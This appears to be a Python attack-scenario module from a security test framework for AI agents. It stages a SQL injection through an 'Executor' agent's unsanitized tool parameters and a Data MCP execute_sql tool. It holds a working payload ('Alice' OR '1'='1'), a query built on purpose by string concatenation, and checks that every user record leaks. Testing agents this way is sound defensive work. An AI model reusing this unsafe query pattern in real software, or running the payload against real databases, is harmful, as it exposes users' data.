"""
Scenario 4: Tool Parameter Injection

Category: Tool
Difficulty: Easy
Threats: T-02, T-01

This scenario exploits the Executor Agent's lack of parameter sanitization
and the Data MCP's execute_sql vulnerability to perform SQL injection.
"""

from uuid import uuid4
from loguru import logger

from src.scenarios import AttackScenario, AttackStep, Criterion, ScenarioCategory, ScenarioDifficulty
from src.database.connection import get_db
from src.database.queries import create_identity
from src.mcps.data_mcp import DataMCPServer
from src.identity.context import IdentityContext


scenario_state = {
    "executor_id": None,
    "test_users": [],
    "injection_query": None,
    "injection_results": None,
}


def setup_scenario():
    """Set up Executor and test users."""
    logger.info("Setting up Scenario 4: Tool Parameter Injection")
    
    with get_db() as db:
        executor = create_identity(db, identity_type="agent", name="executor-001", permissions=["read", "write", "execute"])
        scenario_state["executor_id"] = executor.id
        
        # Create test users
        for name in ["Alice", "Bob", "Charlie"]:
            user = create_identity(db, identity_type="user", name=name, email=f"{name.lower()}@test.com", permissions=["read"])
            scenario_state["test_users"].append({"id": user.id, "name": name})
    
    logger.info(f"✓ Setup complete: {len(scenario_state['test_users'])} test users created")


def step1_normal_query():
    """Execute a normal query to find Alice."""
    data_mcp = DataMCPServer()
    identity_ctx = IdentityContext(user_id=uuid4(), agent_id=scenario_state["executor_id"], permissions={"read", "execute"})
    
    result = data_mcp.read_data(
        table="identities",
        filters={"name": "Alice"},
        identity_context=identity_ctx
    )
    logger.info(f"Normal query returned {len(result.get('data', []))} results")
    return len(result.get("data", [])) == 1


def step2_construct_injection_query():
    """Construct SQL injection payload."""
    # User provides malicious input: "Alice' OR '1'='1"
    malicious_input = "Alice' OR '1'='1"
    
    # VULNERABILITY: T-02 - No parameter sanitization
    # Executor constructs query without sanitization
    scenario_state["injection_query"] = f"SELECT * FROM identities WHERE name = '{malicious_input}'"
    logger.info(f"Constructed injection query: {scenario_state['injection_query']}")
    return True


def step3_execute_injection():
    """Execute the SQL injection via Data MCP."""
    data_mcp = DataMCPServer()
    identity_ctx = IdentityContext(user_id=uuid4(), agent_id=scenario_state["executor_id"], permissions={"read", "execute"})
    
    # VULNERABILITY: T-02 - execute_sql allows arbitrary SQL
    result = data_mcp.execute_sql(
        query=scenario_state["injection_query"],
        identity_context=identity_ctx
    )
    
    scenario_state["injection_results"] = result.get("results", [])
    logger.info(f"Injection returned {len(scenario_state['injection_results'])} results")
    return len(scenario_state["injection_results"]) > 1


def step4_verify_all_users_exposed():
    """Verify that all users were returned, not just Alice."""
    if not scenario_state["injection_results"]:
        return False
    
    # Should have returned all users, not just Alice
    returned_count = len(scenario_state["injection_results"])
    expected_count = len(scenario_state["test_users"])
    
    logger.info(f"Returned {returned_count} users (expected at least {expected_count})")
    return returned_count >= expected_count


def step5_no_sanitization_warning():
    """Verify no sanitization warning was logged."""
    # If we got here without exception, no sanitization occurred
    logger.info("No sanitization warning - injection succeeded")
    return True


def criterion_injection_succeeded():
    """Check if SQL injection succeeded."""
    return len(scenario_state.get("injection_results", [])) > 1


def criterion_all_users_returned():
    """Check if all users were returned."""
    return len(scenario_state.get("injection_results", [])) >= len(scenario_state["test_users"])


def criterion_no_error():
    """Check that no error was raised."""
    return True  # If we got here, no exception


def evidence_injection_query():
    """Show the injected SQL query."""
    return f"Injected query: {scenario_state.get('injection_query', 'N/A')}"


def evidence_results():
    """Show the injection results."""
    count = len(scenario_state.get("injection_results", []))
    return f"Returned {count} users (should have been 1)"


def evidence_no_sanitization():
    """Show evidence of no sanitization."""
    return "No sanitization performed - malicious SQL executed directly"


def capture_state_before():
    """Capture state before attack."""
    return {
        "test_users_count": len(scenario_state["test_users"]),
        "injection_query": None,
    }


def capture_state_after():
    """Capture state after attack."""
    return {
        "test_users_count": len(scenario_state["test_users"]),
        "injection_query": scenario_state["injection_query"],
        "results_count": len(scenario_state.get("injection_results", [])),
    }


def create_scenario() -> AttackScenario:
    """Create Scenario 4: Tool Parameter Injection."""
    return AttackScenario(
        id="S04",
        name="Tool Parameter Injection",
        category=ScenarioCategory.TOOL,
        difficulty=ScenarioDifficulty.EASY,
        description="Exploit Executor's lack of parameter sanitization and Data MCP's execute_sql to perform SQL injection.",
        threat_ids=["T-02", "T-01"],
        setup=setup_scenario,
        attack_steps=[
            AttackStep("Execute normal query for Alice", step1_normal_query, "Query returned 1 result", "Normal query failed"),
            AttackStep("Construct SQL injection payload", step2_construct_injection_query, "Injection query constructed", "Failed to construct"),
            AttackStep("Execute SQL injection via Data MCP", step3_execute_injection, "Injection executed", "Injection failed"),
            AttackStep("Verify all users exposed", step4_verify_all_users_exposed, "All users returned", "Not all users returned"),
            AttackStep("Verify no sanitization warning", step5_no_sanitization_warning, "No warning logged", "Warning was logged"),
        ],
        success_criteria=[
            Criterion("SQL injection succeeded", criterion_injection_succeeded, evidence_injection_query),
            Criterion("All users returned (not just Alice)", criterion_all_users_returned, evidence_results),
            Criterion("No error or sanitization occurred", criterion_no_error, evidence_no_sanitization),
        ],
        state_before=capture_state_before,
        state_after=capture_state_after,
        observable_changes=[
            "SQL injection query executed",
            "All users exposed instead of just Alice",
            "No parameter sanitization performed",
            "Audit log shows injected SQL query"
        ],
        agents_involved=["Executor"],
        mcps_involved=["Data MCP"],
        estimated_duration=15,
    )
